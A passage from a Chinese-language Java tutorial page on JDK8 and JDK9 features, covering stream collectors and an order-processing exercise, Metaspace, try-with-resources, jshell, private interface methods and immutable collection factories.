class="string">"北京"</span>, <span class="number">20</span>),<span class="keyword">new</span> Student(<span class="string">"海南"</span>, <span class="number">25</span>));</span><br><span class="line">IntSummaryStatistics summaryStatistics = students.stream().collect(Collectors.summarizingInt(Student::getAge));</span><br><span class="line">System.out.println(<span class="string">"平均值："</span> + summaryStatistics.getAverage());</span><br><span class="line">System.out.println(<span class="string">"⼈数："</span> + summaryStatistics.getCount());</span><br><span class="line">System.out.println(<span class="string">"最⼤值："</span> + summaryStatistics.getMax());</span><br><span class="line">System.out.println(<span class="string">"最⼩值："</span> + summaryStatistics.getMin());</span><br><span class="line">System.out.println(<span class="string">"总和："</span> + summaryStatistics.getSum());</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String province;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProvince</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> province;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProvince</span><span class="params">(String province)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.province = province;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String province, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.province = province;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JDK8-Collection和Lambda实战"><a href="#JDK8-Collection和Lambda实战" class="headerlink" title="JDK8 Collection和Lambda实战"></a>JDK8 Collection和Lambda实战</h1><h2 id="Collection和Lambda电商数据处理实战需求说明"><a href="#Collection和Lambda电商数据处理实战需求说明" class="headerlink" title="Collection和Lambda电商数据处理实战需求说明"></a>Collection和Lambda电商数据处理实战需求说明</h2><p>需求描述：电商订单数据处理，根据下⾯的videoOrders1 5个订单 和videoOrders2 6个订单 </p><ol><li>统计出同时被两个⼈购买的商品列表(交集) </li><li>统计出两个⼈购买商品的差集 </li><li>统计出全部被购买商品的去重并集 </li><li>统计两个⼈的分别购买订单的平均价格</li><li>统计两个⼈的分别购买订单的总价格</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//总价 35</span></span><br><span class="line"> List&lt;VideoOrder&gt; videoOrders1 = Arrays.asList(</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"20190242812"</span>, <span class="string">"springboot教程"</span>, <span class="number">3</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"20194350812"</span>, <span class="string">"微服务SpringCloud"</span>, <span class="number">5</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"20190814232"</span>, <span class="string">"Redis教程"</span>, <span class="number">9</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"20190523812"</span>, <span class="string">"⽹⻚开发教程"</span>, <span class="number">9</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"201932324"</span>, <span class="string">"百万并发实战Netty"</span>, <span class="number">9</span>));</span><br><span class="line"> <span class="comment">//总价 54</span></span><br><span class="line"> List&lt;VideoOrder&gt; videoOrders2 = Arrays.asList(</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"2019024285312"</span>, <span class="string">"springboot教程"</span>, <span class="number">3</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"2019081453232"</span>, <span class="string">"Redis教程"</span>, <span class="number">9</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"20190522338312"</span>, <span class="string">"⽹⻚开发教程"</span>, <span class="number">9</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"2019435230812"</span>, <span class="string">"Jmeter压⼒测试"</span>, <span class="number">5</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"2019323542411"</span>, <span class="string">"Git+Jenkins持续集成"</span>, <span class="number">7</span>),</span><br><span class="line"> <span class="keyword">new</span> VideoOrder(<span class="string">"2019323542424"</span>, <span class="string">"Idea全套教程"</span>, <span class="number">21</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VideoOrder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String tradeNo;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> money;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VideoOrder</span><span class="params">(String tradeNo,String title, <span class="keyword">int</span> money )</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tradeNo = tradeNo;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getTradeNo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tradeNo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTradeNo</span><span class="params">(String tradeNo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tradeNo = tradeNo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMoney</span><span class="params">(<span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;<span class="function"><span class="keyword">public</span> String <span class="title">getTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> title;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理电商订单数据的答案"><a href="#处理电商订单数据的答案" class="headerlink" title="处理电商订单数据的答案"></a>处理电商订单数据的答案</h2><p>使⽤jdk8新特性完成订单需求1，2，3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改VideoOrder</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj <span class="keyword">instanceof</span> VideoOrder) &#123;</span><br><span class="line">        VideoOrder o1 = (VideoOrder)obj;</span><br><span class="line">        <span class="keyword">return</span> title.equals(o1.getTitle());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.equals(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"VideoOrder&#123;"</span> +</span><br><span class="line">        <span class="string">"money="</span> + money +</span><br><span class="line">        <span class="string">", title='"</span> + title + <span class="string">'\''</span> +</span><br><span class="line">        <span class="string">'&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> title.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//交集</span></span><br><span class="line">List&lt;VideoOrder&gt; intersectionList = videoOrders1.stream().filter(videoOrders2::contains).collect(Collectors.toList());</span><br><span class="line">System.out.println(<span class="string">"交集="</span>+intersectionList);</span><br><span class="line"><span class="comment">//差集1</span></span><br><span class="line">List&lt;VideoOrder&gt; diffList1 = videoOrders1.stream().filter(obj-&gt;!videoOrders2.contains(obj)).collect(Collectors.toList());</span><br><span class="line">System.out.println(<span class="string">"差集1="</span>+diffList1);</span><br><span class="line"><span class="comment">//差集2</span></span><br><span class="line">List&lt;VideoOrder&gt; diffList2 = videoOrders2.stream().filter(obj-&gt;!videoOrders1.contains(obj)).collect(Collectors.toList());</span><br><span class="line">System.out.println(<span class="string">"差集2="</span>+diffList2);</span><br><span class="line"><span class="comment">//并集</span></span><br><span class="line">List&lt;VideoOrder&gt; allVideoOrder = videoOrders1.parallelStream().collect(Collectors.toList());</span><br><span class="line">allVideoOrder.addAll(videoOrders2);</span><br><span class="line">System.out.println(<span class="string">"并集 = "</span>+allVideoOrder);</span><br><span class="line"><span class="comment">//去重并集</span></span><br><span class="line">List&lt;VideoOrder&gt; allVideoOrderDistinct = allVideoOrder.stream().distinct().collect(Collectors.toList());</span><br><span class="line">System.out.println(<span class="string">"去重并集 = "</span>+allVideoOrderDistinct);</span><br></pre></td></tr></table></figure><p>使⽤jdk8新特性完成订单需求4，5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//两个订单平均价格</span></span><br><span class="line"><span class="keyword">double</span> videoOrderAvg1 = videoOrders1.stream().collect(Collectors.averagingInt(VideoOrder::getMoney)).doubleValue();</span><br><span class="line">System.out.println(<span class="string">"订单列表1平均价格="</span>+videoOrderAvg1);</span><br><span class="line"><span class="keyword">double</span> videoOrderAvg2 = videoOrders2.stream().collect(Collectors.averagingInt(VideoOrder::getMoney)).doubleValue();</span><br><span class="line">System.out.println(<span class="string">"订单列表2平均价格="</span>+videoOrderAvg2);</span><br><span class="line"><span class="comment">//订单总价</span></span><br><span class="line"><span class="keyword">int</span> totalMoney1 = videoOrders1.stream().collect(Collectors.summingInt(VideoOrder::getMoney)).intValue();</span><br><span class="line"><span class="keyword">int</span> totalMoney2 = videoOrders2.stream().collect(Collectors.summingInt(VideoOrder::getMoney)).intValue();</span><br><span class="line">System.out.println(<span class="string">"订单列表1总价="</span>+totalMoney1);</span><br><span class="line">System.out.println(<span class="string">"订单列表2总价="</span>+totalMoney2);</span><br></pre></td></tr></table></figure><h1 id="JDK8-新的内存空间和异常处理"><a href="#JDK8-新的内存空间和异常处理" class="headerlink" title="JDK8 新的内存空间和异常处理"></a>JDK8 新的内存空间和异常处理</h1><h2 id="JDK8新特性之新内存空间Matespace"><a href="#JDK8新特性之新内存空间Matespace" class="headerlink" title="JDK8新特性之新内存空间Matespace"></a>JDK8新特性之新内存空间Matespace</h2><p>JVM 种类有很多，⽐如 Oralce-Sun Hotspot，Oralce JRockit，IBM J9，Taobao JVM，我们讲的是 Hotspot才有，JRockit以及J9是没有这个区域 </p><p>JVM内存知识：在JDK8之前的HotSpot JVM，有个区域叫做“永久代(permanent generation)，通过在命令⾏设置参数-XX:MaxPermSize来设定永久代最⼤可分配的内存空间 </p><p>如果JDK8⾥⾯设置了PermSize 和 MaxPermSize 会被忽略并给出警告 </p><p>新内存空间Matespace作⽤：该块内存主要是被JVM⽤来存放 class 和 mate 信息的，当 class 被加载 loader 的时候就会 被存储到该内存区中，如⽅法的编译信息及字节码、常量池和符号解析、类的层级信息，字段，名字等 </p><p>有⼤项⽬经验的同学对下⾯这个异常应该熟悉 java.lang.OutOfMemoryError: PermGen space 原因是: 永久代空间不够，类太多导致</p><p> jdk8的修改：JDK8 HotSpot JVM 使⽤本地内存来存储类元数据信息，叫做元空间（Metaspace） 在默认情况下Metaspace的⼤⼩只与本地内存⼤⼩有关 常⽤的两个参数 -XX:MetaspaceSize=N 指Metaspace扩容时触发FullGC的初始化阈值 -XX:MaxMetaspaceSize=N 指⽤于限制Metaspace增⻓的上限，防⽌因为某些情况导致 Metaspace⽆限的使⽤本地内存，不管两个参数如何设置，都会从20.8M开始，然后随着类加载越来越多不断扩容调整直到最⼤ </p><p><strong>查看⼤⼩ jstat -gc pid</strong> </p><ol><li>MC: current metaspace capacity </li><li>MU: mateaspace utilization 单位是KB</li></ol><h2 id="JDK7新特性之try-with-resources"><a href="#JDK7新特性之try-with-resources" class="headerlink" title="JDK7新特性之try-with-resources"></a>JDK7新特性之try-with-resources</h2><p>什么是try-with-resources？资源的关闭很多⼈停留在旧的流程上，jdk7新特性就有，但是很多⼈以为是jdk8的 在try( …)⾥声明的资源，会在try-catch代码块结束后⾃动关闭掉</p><p>旧的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String path = <span class="string">"/Users/jack/Desktop/t.txt"</span>;</span><br><span class="line">    test(path);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    OutputStream out = <span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        out.write((filepath+<span class="string">"可以学习java架构课程"</span>).getBytes());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            out.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(String filepath)</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>(OutputStream out = <span class="keyword">new</span> FileOutputStream(filepath);) &#123;</span><br><span class="line">        out.write((filepath+<span class="string">"可以学习java架构课程"</span>).getBytes());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意</p><ol><li>实现了AutoCloseable接⼝的类，在try()⾥声明该类实例的时候，try结束后⾃动调⽤的 close⽅法，这个动作会早于finally⾥调⽤的⽅法</li><li>不管是否出现异常，try()⾥的实例都会被调⽤close⽅法</li><li>try⾥⾯可以声明多个⾃动关闭的对象，越早声明的对象，会越晚被close掉</li></ol><h1 id="JDK9常⻅特性"><a href="#JDK9常⻅特性" class="headerlink" title="JDK9常⻅特性"></a>JDK9常⻅特性</h1><h2 id="jdk9新增测试⼯具jshell"><a href="#jdk9新增测试⼯具jshell" class="headerlink" title="jdk9新增测试⼯具jshell"></a>jdk9新增测试⼯具jshell</h2><p>什么是jshell？</p><p>从java9开始，jdk引⼊了交互式 REPL（Read-Eval-Print-Loop，读取-求值-输出-循环） </p><p>官⽅⽂档 <a href="https://docs.oracle.com/en/java/javase/12/jshell/introduction-jshell.html#GUID-630F27C8-1195-4989-9F6B-2C51D46F52C8" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/12/jshell/introduction-jshell.html#GUID-630F27C8-1195-4989-9F6B-2C51D46F52C8</a></p><p>常⽤命令 帮助命令/help /help intro </p><p>列出输⼊的源 /list </p><p>编辑某个源 /edit </p><p>删除 /drop </p><p>退出jshell命令 /exit</p><p>重置 /reset </p><p>查看历史编辑 /history</p><p>⾃动化补⻬功能 Tab键</p><h2 id="接⼝⽅法进阶之JDK9私有⽅法"><a href="#接⼝⽅法进阶之JDK9私有⽅法" class="headerlink" title="接⼝⽅法进阶之JDK9私有⽅法"></a>接⼝⽅法进阶之JDK9私有⽅法</h2><p>什么是jdk9新增的接⼝私有⽅法 </p><ul><li>JDK8新增了静态⽅法和默认⽅法，但是不⽀持私有⽅法 </li><li>jdk9中新增了私有⽅法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderPay</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pay</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">defaultPay</span><span class="params">()</span></span>&#123;</span><br><span class="line">        privateMethod();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//接⼝的私有⽅法可以在JDK9中使⽤</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">privateMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"调⽤接⼝的私有⽅法"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPayImpl</span> <span class="keyword">implements</span> <span class="title">OrderPay</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我实现了接⼝"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    OrderPay orderPay = <span class="keyword">new</span> OrderPayImpl();</span><br><span class="line">    orderPay.defaultPay();</span><br><span class="line">    orderPay.pay();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意点（⾯试题！！！）：</p><ol><li>接⼝中的静态⽅法不能被实现类继承和⼦接⼝继承，但是接⼝中的⾮静态的默认⽅法可以被实现类继承 </li><li>例如List.of() ⽅法，ArrayList虽然继承了List，但是不能⽤ArrayList.of()⽅法 </li><li>类的静态⽅法可以被继承</li></ol><h2 id="JDK9新特性之增强try-with-resource"><a href="#JDK9新特性之增强try-with-resource" class="headerlink" title="JDK9新特性之增强try-with-resource"></a>JDK9新特性之增强try-with-resource</h2><p>什么是try-with-resource </p><p>在JDK7中，新增了try-with-resources语句，可以在try后的括号中初始化资源，可以实现资源⾃动关闭</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OutputStream out = <span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line"><span class="keyword">try</span>(OutputStream temp = out;) &#123;</span><br><span class="line">    temp.write((filepath+<span class="string">"可以学习java架构课程"</span>).getBytes());</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>什么是增强try-with-resource</p><ol><li>在JDK9中，改进了try-with-resources语句，在try外进⾏初始化，在括号内引⽤，即可实现资源⾃动关闭，多个变量则⽤分号进⾏分割 </li><li>不需要声明资源 out 就可以使⽤它，并得到相同的结果</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String path = <span class="string">"/Users/xdclass/Desktop/t.txt"</span>;</span><br><span class="line">    test(path);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    OutputStream out = <span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line">    <span class="keyword">try</span> (out) &#123;</span><br><span class="line">        out.write((filepath + <span class="string">"可以学习java架构课程"</span>).getBytes());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JDK9的Stream和集合API"><a href="#JDK9的Stream和集合API" class="headerlink" title="JDK9的Stream和集合API"></a>JDK9的Stream和集合API</h1><h2 id="JDK9之快速创建只读集合"><a href="#JDK9之快速创建只读集合" class="headerlink" title="JDK9之快速创建只读集合"></a>JDK9之快速创建只读集合</h2><p>什么是只读集合：集合只能读取，不能增加或者删除⾥⾯的元素</p><p>JDK9之前创建只读集合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">list.add(<span class="string">"SpringBoot课程"</span>);</span><br><span class="line">list.add(<span class="string">"架构课程"</span>);</span><br><span class="line">list.add(<span class="string">"微服务SpringCloud课程"</span>);</span><br><span class="line"><span class="comment">//设置为只读List集合</span></span><br><span class="line">list = Collections.unmodifiableList(list);</span><br><span class="line">System.out.println(list);</span><br><span class="line">Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">set.add(<span class="string">"Mysql教程"</span>);</span><br><span class="line">set.add(<span class="string">"Linux服务器教程"</span>);</span><br><span class="line">set.add(<span class="string">"Git教程"</span>);</span><br><span class="line"><span class="comment">//设置为只读Set集合</span></span><br><span class="line">set = Collections.unmodifiableSet(set);</span><br><span class="line">System.out.println(set);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="string">"key1"</span>, <span class="string">"课程1"</span>);</span><br><span class="line">map.put(<span class="string">"key2"</span>, <span class="string">"课程2"</span>);</span><br><span class="line"><span class="comment">//设置为只读Map集合</span></span><br><span class="line">map = Collections.unmodifiableMap(map);</span><br><span class="line">System.out.println(map);</span><br></pre></td></tr></table></figure><p>JDK9后创建只读集合 </p><ul><li>查看of()源码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = List.of(<span class="string">"SpringBoot课程"</span>, <span class="string">"架构课程"</span>, <span class="string">"微服务SpringCloud课程"</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line">Set&lt;String&gt; set = Set.of(<span class="string">"Mysql教程"</span>, <span class="string">"Linux服务器教程"</span>, <span class="string">"Git教程"</span>);</span><br><span class="line">System.out.println(set);</span><br><span class="line">Map&lt;String, String&gt; map = Map.of(<span class="string">"key1"</span>, <span class="string">"课程1"</span>, <span class="string">"key2"</span>, <span class="string">"课程2"</span>);</span><br><span class="line">System.out.println(map);</span><br></pre></td></tr></table></figure><h2 id="JDK9之新增Stream-API"><a href="#JDK9之新增Stream-API" class="headerlink" title="JDK9之新增Stream API"></a>JDK9之新增Stream API</h2><p><strong>takeWhile</strong> </p><p>有序的集合：从 Stream 中获取⼀部分数据, 返回从头开始的尽可能多的元素, 直到遇到第⼀ 个false结果，如果第⼀个值不满⾜断⾔条件，将返回⼀个空的 Stream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = List.of(<span class="string">"springboot"</span>,<span class="string">"java"</span>,<span class="string">"html"</span>,<span class="string">""</span>,<span class="string">"git"</span>).stream().takeWhile(obj-&gt;!obj.isEmpty()).collect(Collectors.toList());</span><br><span class="line"><span class="comment">//⽆序集合，返回元素不固定，暂⽆⽆实际使⽤场景</span></span><br><span class="line">Set&lt;String&gt; set = Set.of(<span class="string">"springboot"</span>,<span class="string">"java"</span>,<span class="string">"html"</span>,<span class="string">""</span>,<span class="string">"git"</span>).stream().takeWhile(obj-&gt;!obj.isEmpty()).collect(Collectors.toList());</span><br></pre></td></tr></table></figure><p><strong>dropWhile</strong></p><p>与 takeWhile相反，返回剩余的元素，和takeWhile⽅法形成互补</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = List.of(<span class="string">"springboot"</span>,<span class="string">"java"</span>,<span class="string">"html"</span>,<span class="string">""</span>,<span class="string">"git"</span>).stream().dropWhile(obj-&gt;!obj.isEmpty()).collect(Collectors.toList());</span><br></pre></td></tr></table></figure><p>⽆序Stream⾥⾯也⽆实际使⽤场景</p><p>bug 